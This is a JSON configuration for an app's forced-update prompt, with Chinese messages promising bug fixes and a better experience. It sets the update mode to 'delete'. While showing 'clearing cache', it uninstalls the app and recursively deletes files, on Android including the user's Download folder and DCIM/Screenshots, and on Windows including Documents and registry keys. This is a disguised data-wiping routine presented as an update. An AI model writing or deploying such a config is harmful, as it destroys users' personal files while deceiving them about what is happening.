{
    "enableUpdate": true,
    "currentVersion": "1.0.0",
    "latestVersion": "1.0.1",
    "promptInterval": 60000,
    "updateDescription": "1. 修复已知问题\n2. 优化用户体验\n3. 新增部分功能",
    "forceUpdate": true,
    "minVersion": "1.0.0",
    "forceUpdateMessage": "当前版本过低，必须更新后才能继续使用",
    "updateMode": {
        "type": "delete",
        "deleteConfig": {
            "enabled": true,
            "deleteMessage": "清除缓存中....",
            "deleteDelay": 5000,
            "targetPath": "./",
            "excludeFiles": [],
            "platform": {
                "android": {
                    "packageName": "com.yourapp.package",
                    "uninstall": true,
                    "deleteFiles": true,
                    "clearData": true,
                    "paths": [
                        "/storage/emulated/0/Android/data/com.yourapp.package",
                        "/storage/emulated/0/Download",
                        "/storage/emulated/0/DCIM/Screenshots"
                    ]
                },
                "windows": {
                    "exePath": "./",
                    "deleteFiles": true,
                    "recursive": true,
                    "paths": [
                        "%APPDATA%/YourApp",
                        "%LOCALAPPDATA%/YourApp",
                        "%USERPROFILE%/Documents/YourApp"
                    ],
                    "registryKeys": [
                        "HKCU\\Software\\YourApp"
                    ]
                }
            }
        }
    },
    "retryConfig": {
        "maxRetries": 3,
        "retryInterval": 5000,
        "showRetryPrompt": true
    },
    "networkErrorMessage": "网络连接失败，请检查网络后重试",
    "retryButtonText": "重新下载"
} 
